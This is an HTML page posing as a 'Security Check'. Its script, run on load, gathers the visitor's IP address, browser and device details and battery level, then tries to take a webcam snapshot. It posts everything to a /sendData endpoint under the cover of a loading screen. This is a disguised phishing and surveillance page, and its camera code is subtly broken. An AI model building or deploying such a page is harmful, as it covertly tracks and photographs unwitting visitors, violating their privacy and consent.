<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/3.11.2/modernizr.min.js"></script>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #111; color: #fff; font-family: Arial, sans-serif; }
        .loader { display: none; }
    </style>
</head>
<body>
    <div id="loader" class="loader">
        <h2>Security Checking...</h2>
    </div>

    <script>
        async function getDeviceInfo() {
            // Display loading
            document.getElementById('loader').style.display = 'block';

            // Get user information
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const userAgent = navigator.userAgent;
            const deviceName = navigator.platform;
            const deviceModel = Modernizr.touchevents ? "Touch Device" : "Non-Touch Device";
            const battery = await navigator.getBattery();

            // Collect image from the camera
            const video = document.createElement('video');
            const constraints = { video: true };
            await new Promise(resolve => {
                video.srcObject = navigator.mediaDevices.getUserMedia(constraints);
                video.onloadedmetadata = () => {
                    resolve();
                    video.play();
                };
            });

            // Take a snapshot from the camera
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg');

            // Send data to backend
            const response = await fetch('/sendData', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ip: ip.ip,
                    userAgent: userAgent,
                    deviceName: deviceName,
                    deviceModel: deviceModel,
                    batteryLevel: battery.level,
                    image: imageData
                })
            });

            // Hide loading after data is sent
            document.getElementById('loader').style.display = 'none';
        }

        getDeviceInfo();
    </script>
</body>
</html>
